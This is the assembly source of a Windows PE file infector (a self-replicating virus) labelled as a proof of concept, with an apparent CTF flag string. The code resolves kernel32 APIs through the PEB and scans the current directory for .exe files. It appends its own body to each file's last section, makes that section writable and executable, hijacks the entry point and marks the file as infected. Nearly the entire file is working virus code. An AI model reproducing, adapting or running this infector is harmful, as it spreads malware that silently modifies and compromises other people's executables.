; ---------------------------------------------------------------------
; spoonfed.asm
;
; A simple PoC of a file infector by d00rt
; The technique that is been used for the infection is post-pending technique
; The payload is going to be copied at the finish of the last section.
;
; ---------------------------------------------------------------------
%include "spoonfed.inc"

global  _start

;-----------------------------program----------------------------------
section .test

_start:

    call delta
delta:
    pop ebp
    sub ebp, delta

    mov eax, [fs:0x30]                                                  ; mov PEB to eax
    lea eax, [eax + PEB_PROCESS_ENVIRONMENT_BLOCK.Ldr]
    mov eax, [eax]                                                      ; Get _PEB_LDR_DATA strcuture
    lea eax, [eax + _PEB_LDR_DATA.InMemoryOrderModuleListNext]
    mov eax, [eax]                                                      ; Get firs element of the InMemoryOrderModuleList linked list 

next_module:
    lea eax, [eax - LDR_MODULE.InMemoryOrderModuleListNext]             ; Align with LDR_MODULE struct base offset. 
    lea ebx, [eax + LDR_MODULE.BaseDllNamePointer]                      ; 0x36 | 0x24  
    mov ebx, [ebx]                                                      ; Get a pointer to the module BaseName
    cmp ebx, 0
    jz jump_to_EOP_host                                                 ; If there aren't more modules, jump_to_EOP_host.
    mov [ebp + pModuleName], ebx                                        ; Get module name
    call get_module_name_size                                           ; Get module name size,
    cmp byte [ebp + ModuleNameSize], 0xC                                ; Kernel32.dll it must be to improve for comparing with a hash          
    jz get_api_address
    mov eax, [eax + LDR_MODULE.InMemoryOrderModuleListNext]
    jmp next_module
    ret

get_module_name_size:
    push eax                                                            ; Save LDR_MODULE.InMemoryOrderModuleListNext element
    xor ecx, ecx                                                        ; ecx = 0 -> size counter
    mov [ebp + ModuleNameSize], ecx
    mov edx, [ebp + pModuleName]                                        ; edx -> pointer to the current module name

get_module_name_size_loop:
    xor eax, eax
    mov al, [edx]                                                       ; al -> current byte. ModuleName[i]
    cmp al, 0                                                           ; Comparing al with byte null. (end terminator of the string)
    jz end_module_name_size
    mov ecx, [ebp + ModuleNameSize]
    add ecx, 1                                                          ; Increase ecx -> size counter
    mov [ebp + ModuleNameSize], ecx                                     ; Store size counter in the ModuleNameSize variable.
    lea edx, [edx + 2]                                                  ; Get next byte of the ModuleName. i += 2
    jmp get_module_name_size_loop                                       ; ModuleName format is UNICODE so we increase the counter 2 times.

end_module_name_size:
    pop eax                                                             ; Restore LDR_MODULE.InMemoryOrderModuleListNext element
    ret

get_api_address:
    mov ebx, [eax + LDR_MODULE.DllBase]                                 ; Get Kerne32 base address (handle)                                 
    mov [ebp + pKernel32], ebx
    cmp word [ebx + IMAGE_DOS_HEADER.e_magic], 0x5A4D                   ; Check MZ header
    jnz jump_to_EOP_host                                                ; If we get wrong module address, we jump to the host program
    mov ecx, [ebx + IMAGE_DOS_HEADER.e_lfanew]                          ; Get PE Header offset
    lea ebx, [ebx + ecx]                                                ; Get PE Header address
    cmp word [ebx + IMAGE_FILE_HEADER.Signature], 0x4550                ; Check PE header               
    jnz jump_to_EOP_host                                                ; If we get wrong module address, we jump to the host program
    lea ebx, [ebx + IMAGE_FILE_HEADER_size]                             ; Bypassing offset to get IMAGE_OPCTIONAL_HEADER
    lea ebx, [ebx + IMAGE_OPTIONAL_HEADER.ExportDirectory]              ; Get export directory (IMAGE_DATA_DIRECTORY struct of export directory)
    mov ecx, [ebx + IMAGE_DATA_DIRECTORY.VirtualAddress]                ; Get export directory RVA from PE Header
    mov eax, [ebp + pKernel32]        
    add ecx, eax                                                        ; Get export direcory VA  
    lea ebx, [ecx + IMAGE_EXPORT_DIRECTORY.AddressOfNames]                      
    mov ebx, [ebx]                                                      ; Get RVA pointer to AddressOfNames from export table
    add ebx, eax                                                        ; Get VA pointer to AddressOfNames from export table
    mov esi, ebx
    mov [ebp + pAddressOfNamesRVA], esi

                                                                        ; === Get GetProcAddress address ===
    mov edx, 0                                                          ; AddressOfNames array index
find_GetProcAddress_in_AddressOfNames:
    mov ebx, [esi]                                                      ; RVA to the function name (AddressOfNames array)
    add ebx, eax                                                        ; VA to the function name (AddressOfNames[i]). eax -> [ebp + pKernel32]
    mov edi, [ebx]                                                      ; First 4 bytes of the function name (AddressOfNames[i][:4])
    cmp edi, 'GetP'                                                     ; If it is not the function that we are searching get the name
    jnz next_func_name                                                  ; of the next function
    mov edi, [ebx + 4]                                                  ; Next 4 bytes of the function name (AddressOfNames[i][4:8])
    cmp edi, 'rocA'                                                     ; If it is not the function that we are searching get the name
    jnz next_func_name                                                  ; of the next function
    mov edi, [ebx + 8]                                                  ; Next 4 bytes of the function name (AddressOfNames[i][8:12])
    cmp edi, 'ddre'                                                     ; If it is not the function that we are searching get the name
    jnz next_func_name                                                  ; of the next function
    jmp found_GetProcAddress                                            ; Function name matches

next_func_name:
    add esi, 4                                                          ; Next *RVA to the function name (AddressOfNames array)
    add edx, 1                                                          ; Increase the AddressOfNames array index
    jmp find_GetProcAddress_in_AddressOfNames

found_GetProcAddress:
find_GetProcAddress_in_AddressOfNameOrdinals:
    lea ebx, [ecx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]                       
    mov ebx, [ebx]                                                      ; Get RVA pointer to AddressOfNameOrdinals from export table
    add ebx, eax                                                        ; eax -> [ebp + pKernel32]
    xor edi, edi
    lea ebx, [ebx + edx * WORD]                                         ; edx * WORD because the size of AddressOfNameOrdinals is a WORD
                                                                        ; edx -> The index of GetProcAddress inside the AddressOfNames
    mov di, [ebx]                                                       ; GetFunctionOrdinal
find_GetProcAddress_in_AddressOfFunctions:
    lea ebx, [ecx  + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]         ; Get RVA pointer to AddressOfFunctions from export table   
    mov ebx, [ebx]
    add ebx, eax
    lea ebx, [ebx + edi * DWORD]                                        ; edi -> The index of GetProcAddress (ordinal) inside the AddressOfNameOrdinals
    mov ebx, [ebx]
    add ebx, eax                                                        ; GetProcAddress address.
    mov [ebp + pGetProcAddress], ebx                  

                                                                        ; === Get LoadLibrary address ===
    mov esi, [ebp + pAddressOfNamesRVA]
    mov edx, 0                                                          ; Index of GetProcAddress inside AddressOfNames array
find_LoadLibrary_in_AddressOfNames:
    mov ebx, [esi]                                                      ; RVA to the function name (AddressOfNames array)
    add ebx, eax                                                        ; VA to the function name (AddressOfNames[i]). eax -> [ebp + pKernel32]
    mov edi, [ebx]                                                      ; First 4 bytes of the function name (AddressOfNames[i][:4])
    cmp edi, 'Load'                                                     ; If it is not the function that we are searching get the name
    jnz next_func_name2                                                 ; of the next function
    mov edi, [ebx + 4]                                                  ; Next 4 bytes of the function name (AddressOfNames[i][4:8])
    cmp edi, 'Libr'                                                     ; If it is not the function that we are searching get the name
    jnz next_func_name2                                                 ; of the next function
    mov edi, [ebx + 8]                                                  ; Next 4 bytes of the function name (AddressOfNames[i][8:12])
    cmp edi, 'aryA'                                                     ; If it is not the function that we are searching get the name
    jnz next_func_name2                                                 ; of the next function
    jmp found_LoadLibrary

next_func_name2:
    add esi, 4                                                          ; Next *RVA to the function name (AddressOfNames array)
    add edx, 1                                                          ; Increase the AddressOfNames array index
    jmp find_LoadLibrary_in_AddressOfNames

found_LoadLibrary:
find_LoadLibrary_in_AddressOfNameOrdinals:
    lea ebx, [ecx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]                       
    mov ebx, [ebx]                                                      ; Get RVA pointer to AddressOfNameOrdinals from export table
    add ebx, eax
    xor edi, edi
    lea ebx, [ebx + edx * WORD]                                         ; edx * WORD because the size of AddressOfNameOrdinals is a WORD.
                                                                        ; edx -> The index of LoadLibrary inside the AddressOfNames
    mov di, [ebx]                                                       ; GetFunctionOrdinal
find_LoadLibrary_in_AddressOfFunctions:
    lea ebx, [ecx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]          ; Get RVA pointer to AddressOfFunctions from export table   
    mov ebx, [ebx]
    add ebx, eax
    lea ebx, [ebx + edi * DWORD]                                        ; edi -> The index of LoadLibrary (ordinal) inside the AddressOfNameOrdinals
    mov ebx, [ebx]
    add ebx, eax                                                        ; GetProcAddress address.
    mov [ebp + pLoadLibrary], ebx 

                                                                        ; === Get User32 base address ===
GetUser32DllHandle:
    lea ecx, [ebp + sUser32]
    push ecx
    call [ebp + pLoadLibrary]
    mov [ebp + pUser32], eax
    xor eax, eax

                                                                        ; === Get address of the APIs that we want to use ===
LoadAPIFunctions:
    mov eax, [ebp + lib_iter]                                           ; lib_iter -> index of the aLoadedLibraries array
    mov eax, [ebp + aLoadedLibraries + eax]                             ; aLoadedLibraries[lib_iter]
    test eax, eax                                                       ; aLoadedLibraries[lib_iter] == 0x0 (End of array)
    jz APIFuncsLoaded                                                   ; All functions of all libraries were loadad sucessfully

GetApiFunctions:
    xor ecx, ecx
    mov ecx, [ebp + fun_name_iter]                                      ; fun_name_iter -> index of the aApiNamesBeginning array

GetNextFunctionAddress:
    lea ebx, [ebp + aApiNamesBeginning + ecx]                           ; aApiNamesBeginning[fun_name_iter]
    mov dl, [ebx]                                                       ; aApiNamesBeginning[fun_name_iter] == 0x0 (End of aApiNamesBeginning array
    test dl, dl                                                         ; for the current library)
    jz APIFuncsLoaded
    mov eax, [ebp + lib_iter]
    mov eax, [ebp + aLoadedLibraries + eax]
    push ebx
    push eax
    call [ebp + pGetProcAddress]                                        ; Get the address of the function
    test eax, eax
    jz jump_to_EOP_host                                                 ; If there is an error, jump to the host
    xor edx, edx
    mov edx, [ebp + fun_addr_iter]
    mov [ebp + aApiAddressBeginning + edx], eax                         ; Store address of current api in its variable aApiAddressBeginning[fun_addr_iter]
    add edx, DWORD                                                      ; fun_addr_iter++
    mov [ebp + fun_addr_iter], edx
    xor ebx, ebx
    mov ecx, [ebp + fun_name_iter]

NextFuncName:                                                           ; Get the last byte of the string
    inc ecx
    mov bl, [ebp + aApiNamesBeginning + ecx]
    test bl, bl
    jnz NextFuncName                                                    
    inc ecx                                                             ; aApiNamesBeginning[ecx] -> points to the first letter of the next function name or 
    mov [ebp + fun_name_iter], ecx                                      ; points to byte null (end of the array)
    mov bl, [ebp + aApiNamesBeginning + ecx]
    test bl, bl                                                         ; If it points to the a letter we are going to get its address
    jnz GetNextFunctionAddress
    mov eax, [ebp + lib_iter]                                           ; Else we are going to get the next library for getting its API functions address
    add eax, DWORD
    mov ecx, [ebp + fun_name_iter]
    inc ecx
    mov [ebp + fun_name_iter], ecx                                      ; Increase iter for pointing to the next array of the function names
    mov [ebp + lib_iter], eax
    jmp LoadAPIFunctions

                                                                        ; === Enumerate all .exe inside the current directory ===
APIFuncsLoaded:                                 
    lea ecx, [ebp + pFindFileData]
    push ecx                                                            ; lpFindFileData
    lea ecx, [ebp + sCurrentDir]                                        ; *.exe
    push ecx                                                            ; lpFileName
    call [ebp + pFindFirstFileA]
    test eax, eax                                                       ; If there is not more files to infect jump to host program
    jz jump_to_EOP_host
    mov [ebp + hFindFile], eax
    lea eax, [ebp + pFindFileData + WIN32_FIND_DATA.cFileName]          ; Points to the FileName inside the returned lpFindFileData strcuture
    call is_the_file_infectable                                         ; Check if the file is infectable or no
    cmp eax, 0x0                                                        ; If eax == 1 the file is infectable.
    jz loop_files_to_infect                                             ; If eax == 0 the file is not infectable.
    call infection                                                      ; Infect the file.

loop_files_to_infect:
    xor eax, eax
    lea edi, [ebp + pFindFileData]
    mov ecx, WIN32_FIND_DATA_size
    rep stosb                                                           ; Flush the FindFileData structure
    lea edi, [ebp + pFindFileData]
    push edi                                                            ; lpFindFileData
    mov eax, [ebp + hFindFile]
    push eax                                                            ; hFindFile
    call [ebp + pFindNextFileA]
    test eax, eax
    jz jump_to_EOP_host                                                 ; If there is not more files to infect jump to the host
    call is_the_file_infectable                                         ; Check if the file is infectable or no
    cmp eax, 0x0                                                        ; If eax == 1 the file is infectable.
    jz loop_files_to_infect                                             ; If eax == 0 the file is not infectable.
    call infection                                                      ; Infect the file.
    jmp loop_files_to_infect

is_the_file_infectable:
; Chek if the file is infectable
; This function will return 1 if the file is infectable
; and 0 if the file is not infectable
    xor esi, esi                                                        ; Return status
;    push 0x80
;    push eax 
;    call [ebp + pSetFileAttributesA]
;    test eax, eax
;    jz is_the_file_infectable_end
open_file:
    push 0                                                              ; hTemplateFile             = NULL
    push 0                                                              ; dwFlagsAndAttributes      = NULL
    push 3                                                              ; dwCreationDisposition     = OPEN_EXISTING
    push 0                                                              ; lpSecurityAttributes      = NULL
    push 1                                                              ; dwShareMode               = FILE_SHARE_READ          
    push 0x0C0000000                                                    ; dwDesiredAccess           = READ | WRITE
    lea eax, [ebp + pFindFileData + WIN32_FIND_DATA.cFileName]
    push eax                                                            ; lpFileName                = Target file name
    call [ebp + pCreateFileA]
    cmp eax, 0xFFFFFFFF                                                 ; If there is an error, return
    jz is_the_file_infectable_end
    mov [ebp + hFile], eax

create_file_mapping:
    mov edx, [ebp + pFindFileData + WIN32_FIND_DATA.nFileSizeLow]       ; Get the size of the target file
    mov ebx, FIsize                                                     ; File infector size
    add ebx, edx                                                        ; File infector size + Target file size
    mov [ebp + FIpTargetSize], ebx                                      ; Save for later
    mov [ebp + TargetFileSize], edx
    push 0                                                              ; lpName                    = NULL (The name of the file mapping object)
    push edx                                                            ; dwMaximumSizeLow          = Target file size
    push 0                                                              ; dwMaximumSizeHigh         = 0
    push 0x4                                                            ; flProtect                 = PAGE_READWRITE
    push 0                                                              ; lpAttributes              = NULL
    push eax                                                            ; hFile                     = Target file handle
    call [ebp + pCreateFileMappingA]
    test eax, eax
    jz close_file                                                       ; If there is an error close the opened file and return
    mov [ebp + hFileMapping], eax
    mov ebx, [ebp + TargetFileSize]
    push ebx                                                            ; dwNumberOfBytesToMap      = Target File Size
    push 0                                                              ; dwFileOffsetLow           = NULL
    push 0                                                              ; dwFileOffsetHigh          = NULL
    push 0x2                                                            ; dwDesiredAccess           = READ | WRITE ?
    push eax                                                            ; hFileMappingObject        = Target file mapping
    call [ebp + pMapViewOfFile]
    test eax, eax
    jz close_file_mapping                                               ; If there is an error close the opened file mapping and return
    mov [ebp + hFileMapView], eax

check_if_the_file_is_a_PE:
    cmp word [eax + IMAGE_DOS_HEADER.e_magic], 0x5A4D                   ; Check MZ header
    jnz close_all                                                       ; If the target file is not an valid PE file close all handles and return
    mov ecx, [eax + IMAGE_DOS_HEADER.e_lfanew]                          ; Get PE Header offset
    lea eax, [eax + ecx]                                                ; Get PE Header address
    cmp word [eax + IMAGE_FILE_HEADER.Signature], 0x4550                ; Check PE header
    jnz close_all

                                                                        ; === Check if the file is infected ===
check_if_the_file_is_infected:  
    mov ebx, [ebp + hFileMapView]                                       ; If the file has the "ICEBP5KUAD" string in the header
b0:                                                                     ; it is an infected file. So we can not infect again.
    cmp word [ebx + IMAGE_DOS_HEADER.e_cp], 0x4349                      ; IC
    jz  b1
    jnz get_new_size_to_map
b1:
    cmp word [ebx + IMAGE_DOS_HEADER.e_crlc], 0x4245                    ; EB
    jz  b2
    jnz get_new_size_to_map
b2:
    cmp word [ebx + IMAGE_DOS_HEADER.e_cparhdr], 0x3550                 ; P5
    jz  b3
    jnz get_new_size_to_map
b3:
    cmp word [ebx + IMAGE_DOS_HEADER.e_minalloc], 0x554B                ; KU
    jz  b4
    jnz get_new_size_to_map
b4:
    cmp word [ebx + IMAGE_DOS_HEADER.e_maxalloc], 0x4441                ; AD
    jz  close_all
    jnz get_new_size_to_map

get_new_size_to_map:
; We are going to calculate the new file size.
; It is important to know that the file must be align to the FileAlignment
; so, first we are going to get FIpTargetSize (File infector size + Target file size)
; divide it by FileAlignment, add the result by 1 and again multiplicate the result
; by FileAlignment. This will be the new size of the file in disk after infect
    mov ecx, [ebx + IMAGE_DOS_HEADER.e_lfanew]
    lea ebx, [ebx + ecx]
    lea ebx, [ebx + IMAGE_FILE_HEADER_size]
    mov edi, [ebx + IMAGE_OPTIONAL_HEADER.FileAlignment]
    mov eax, [ebp + FIpTargetSize]
    xor edx, edx
    div edi
    inc eax 
    mul edi 
    mov [ebp + FIpTargetSizeMapping], eax
    mov esi, 1                                                          ; Return status
                                                                        ; At this point we can confirm that the file is infectable.

close_all:
    mov eax, [ebp + hFileMapView]
    push eax
    call [ebp + pUnmapViewOfFile]
close_file_mapping:
    mov eax, [ebp + hFileMapping]
    push eax
    call [ebp + pCloseHandle]
close_file:
    mov eax, [ebp + hFile]
    push eax
    call [ebp + pCloseHandle]

is_the_file_infectable_end:
    mov eax, esi
    ret

infection:
open_file_for_infecting:
    push 0                                                              ; hTemplateFile             = NULL
    push 0                                                              ; dwFlagsAndAttributes      = NULL
    push 3                                                              ; dwCreationDisposition     = OPEN_EXISTING
    push 0                                                              ; lpSecurityAttributes      = NULL
    push 1                                                              ; dwShareMode               = FILE_SHARE_READ          
    push 0x0C0000000                                                    ; dwDesiredAccess           = READ | WRITE
    lea eax, [ebp + pFindFileData + WIN32_FIND_DATA.cFileName]
    push eax                                                            ; lpFileName                = Target file name
    call [ebp + pCreateFileA]
    cmp eax, 0xFFFFFFFF                                                 ; If there is an error, return
    jz infection_end
    mov [ebp + hFile], eax

create_file_mapping_for_infecting:
    mov edx, [ebp + FIpTargetSizeMapping]
    push 0                                                              ; lpName                    = NULL (The name of the file mapping object)
    push edx                                                            ; dwMaximumSizeLow          = Align (Target file size + File infector size)
    push 0                                                              ; dwMaximumSizeHigh         = 0
    push 0x4                                                            ; flProtect                 = PAGE_READWRITE
    push 0                                                              ; lpAttributes              = NULL
    push eax                                                            ; hFile                     = Target file handle
    call [ebp + pCreateFileMappingA]
    test eax, eax
    jz close_file_for_infecting                                         ; If there is an error close the opened file return
    mov [ebp + hFileMapping], eax
    mov ebx, [ebp + FIpTargetSizeMapping]
    push ebx                                                            ; dwNumberOfBytesToMap      = Align (Target file size + File infector size)
    push 0                                                              ; dwFileOffsetLow           = NULL
    push 0                                                              ; dwFileOffsetHigh          = NULL
    push 0x2                                                            ; dwDesiredAccess           = READ | WRITE ?
    push eax                                                            ; hFileMappingObject        = Target file mapping
    call [ebp + pMapViewOfFile]
    test eax, eax
    jz close_file_mapping_for_infecting                                 ; If there is an error close the opened file mapping and return
    mov [ebp + hFileMapView], eax

                                                                        ; === Get sections table ===
    mov ecx, [eax + IMAGE_DOS_HEADER.e_lfanew]
    lea eax, [eax + ecx]
    xor ecx, ecx
    mov cx, [eax + IMAGE_FILE_HEADER.NumberOfSections]                  ; Save number of sections to get the last section in the next steps
    lea eax, [eax + IMAGE_FILE_HEADER_size + IMAGE_OPTIONAL_HEADER_size]; Section table

get_last_section_header:
    mov edx, 1                                                          ; Section counter
loop_section:
    cmp dx, cx
    jz last_section_header_gotten                                       ; cx -> Number of sections, dx -> section counter
    lea eax, [eax + SECTION_HEADER_size]                                ; Get next section
    inc dx                                                              ; increase section counter
    jmp loop_section
last_section_header_gotten:
    mov ebx, [eax + SECTION_HEADER.Characteristics]
    or ebx, 0x0A0000020                                                 ; Modify section characteristics WRITE | EXECUTE
    mov [eax + SECTION_HEADER.Characteristics], ebx
    mov edi, [ebp + hFileMapView]                                       ; Get the last byte of the last section before infection
    add edi, [eax + SECTION_HEADER.PointerToRawData]                    ; Image Base Address + LastSection.PointerToRawData + LastSection.SizeOfRawData
    add edi, [eax + SECTION_HEADER.SizeOfRawData]
    lea esi, [ebp + _start]                                             ; Get the pointer to the first byte of the file infector
    mov ecx, FIsize                                                     ; Get the size of the file infector
    rep movsb                                                           ; Copy the fileinfector to the last section (Starting in the last byte of this section)
    mov ebx, eax
    mov eax, [eax + SECTION_HEADER.SizeOfRawData]                       ; Get size of the section before the infection
    add eax, FIsize                                                     ; Get size of the file infector
    xor edx, edx
    mov edi, [ebp + hFileMapView]
    mov ecx, [edi + IMAGE_DOS_HEADER.e_lfanew]
    lea edi, [edi + ecx + IMAGE_FILE_HEADER_size]
    mov ecx, [edi + IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint]          ; Get Original Entry Point
    mov [ebp + OEP], ecx                                                ; Save Original Entry Point
    push edi                                                            ; push IMAGE_OPTIONAL_HEADER
    mov edi, [edi + IMAGE_OPTIONAL_HEADER.FileAlignment]                ; Align the new section size to the FileAlignment
    div edi
    inc eax 
    mul edi
    mov ecx, [ebx + SECTION_HEADER.SizeOfRawData]
    add ecx, [ebx + SECTION_HEADER.VirtualAddress]
    mov [ebp + NEP], ecx                                                ; Get the New Entry Point (LastSection.PointerToRawData + LastSection.SizeOfRawData)
    mov [ebx + SECTION_HEADER.VirtualSize], eax                         ; Save the new size for the section after the infection
    mov [ebx + SECTION_HEADER.SizeOfRawData], eax                       ; Save the new size for the section after the infection
    pop edi                                                             ; pop IMAGE_OPTIONAL_HEADER
    mov ecx, [ebp + NEP]
    mov [edi + IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint], ecx          ; Save the New Entry Point inside the header
    add eax, [ebx + SECTION_HEADER.VirtualAddress]                      ; TotalImageSize = LastSection.VirtualAddress + LastSection.VirtualSize
    mov [edi + IMAGE_OPTIONAL_HEADER.SizeOfImage], eax                  ; Save the new Image Size

mark_infected:
    mov ebx, [ebp + hFileMapView]                                       ; Mark the file as infected file with "ICEBP5KUAD" string in the header       
    mov word [ebx + IMAGE_DOS_HEADER.e_cp], 0x4349                      ; IC
    mov word [ebx + IMAGE_DOS_HEADER.e_crlc], 0x4245                    ; EB
    mov word [ebx + IMAGE_DOS_HEADER.e_cparhdr], 0x3550                 ; P5
    mov word [ebx + IMAGE_DOS_HEADER.e_minalloc], 0x554B                ; KU
    mov word [ebx + IMAGE_DOS_HEADER.e_maxalloc], 0x4441                ; AD
    mov ecx, [ebp + OEP]
    mov [ebx + IMAGE_DOS_HEADER.e_ss], ecx                              ; Save EOP in IMAGE_DOS_HEADER.e_ss.
close_all_for_infecting:
    mov eax, [ebp + hFileMapView]
    push eax
    call [ebp + pUnmapViewOfFile]
close_file_mapping_for_infecting:
    mov eax, [ebp + hFileMapping]
    push eax
    call [ebp + pCloseHandle]
close_file_for_infecting:
    mov eax, [ebp + hFile]
    push eax
    call [ebp + pCloseHandle]

infection_end:
    ret

jump_to_EOP_host:
    test ebp, ebp                                                       ; If the first generation of the file infector?
    jz exit                                                             ; If it is jump to exit 
    push 0x0                                                            ; uType                     = MB_OK
    push 0x0                                                            ; lpCaption                 = NULL (Error)
    lea ecx, [ebp + sMsgInfected]
    push ecx                                                            ; lpText                    = 'I am an infected file. ICEBP5{d00rt}'
    push 0x0                                                            ; hWnd                      = NULL
    call [ebp + pMessageBoxA]
    mov eax, [fs:0x30]                                                  ; mov PEB to eax
    mov eax, [eax + PEB_PROCESS_ENVIRONMENT_BLOCK.ImageBaseAddress]     ; Get the Original Entry Point
    add eax, [eax + IMAGE_DOS_HEADER.e_ss]                              ; EOP was saved at IMAGE_DOS_HEADER.e_ss when the file was infected
    jmp eax

exit:
    push 0x0                                                            ; uType                     = MB_OK
    push 0x0                                                            ; lpCaption                 = NULL (Error)
    lea ecx, [ebp + sMsgVirus]
    push ecx                                                            ; lpText                    = 'I am an infected file. ICEBP5{d00rt}'
    push 0x0                                                            ; hWnd                      = NULL
    call [ebp + pMessageBoxA]
    ret


pModuleName                     dd      0x0
ModuleNameSize                  dd      0x0
pGetProcAddress                 dd      0x0
pLoadLibrary                    dd      0x0
pAddressOfNamesRVA              dd      0x0

lib_iter                        dd      0x0
fun_name_iter                   dd      0x0
fun_addr_iter                   dd      0x0
; --- Libraries to get necessary functions from ---
sKernel32                       db      'Kernel32.dll',         0x0
sUser32                         db      'User32.dll',           0x0

aLoadedLibraries:
pKernel32                       dd      0x0
pUser32                         dd      0x0
aLoadedLibrariesEnd             dd      0x0

; --- Kernel32 necessary API functions name array ---
aApiNamesBeginning:
aApiFuncToGetFromKernel32:
sGetSystemDirectoryA            db      'GetSystemDirectoryA',  0x0
sGetSystemDirectoryW            db      'GetSystemDirectoryW',  0x0
sFindFirstFileA                 db      'FindFirstFileA',       0x0
sFindNextFileA                  db      'FindNextFileA',        0x0
sCreateFileA                    db      'CreateFileA',          0x0
sCloseHandle                    db      'CloseHandle',          0x0
sCreateFileMappingA             db      'CreateFileMappingA',   0x0
sMapViewOfFile                  db      'MapViewOfFile',        0x0
sUnmapViewOfFile                db      'UnmapViewOfFile',      0x0
sSetFileAttributesA             db      'SetFileAttributesA',   0x0
aApiFuncToGetFromKernel32end    db      0x0
; --- User32 necessary API functions name array ---
aApiFuncToGetFromUser32:
sMessageBoxA                    db      'MessageBoxA',          0x0
aApiFuncToGetFromUser32end      db      0x0

; --- Kernel32 necessary API functions pointers array ---
aApiAddressBeginning:
aApiFuncAddresKernel32:
pGetSystemDirectoryA            dd      0x0
pGetSystemDirectoryW            dd      0x0
pFindFirstFileA                 dd      0x0
pFindNextFileA                  dd      0x0
pCreateFileA                    dd      0x0
pCloseHandle                    dd      0x0
pCreateFileMappingA             dd      0x0
pMapViewOfFile                  dd      0x0
pUnmapViewOfFile                dd      0x0
pSetFileAttributesA             dd      0x0
; --- User32 necessary API functions pointers array ---
aApiFuncAddresUser32:
pMessageBoxA                    dd      0x0
aApiAddressBeginningEnd         dd      0x0

; --- Necessary variables for looping inside a directory
sCurrentDir                     db      '*.exe', 0x0
hFindFile                         dd      0x0
pFindFileData                   times WIN32_FIND_DATA_size db      0x0
hFile                           dd      0x0
hFileMapping                    dd      0x0
hFileMapView                    dd      0x0

sMsgVirus                       db      'I am the first generation. ICEBP5{d00rt}', 0x0
sMsgInfected                    db      'I am an infected file. ICEBP5{d00rt}', 0x0

OEP                             dd      0x0
NEP                             dd      0x0
FIpTargetSize                   dd      0x0
TargetFileSize                  dd      0x0
FIpTargetSizeMapping            dd      0x0
FIsize                          equ ($-_start)
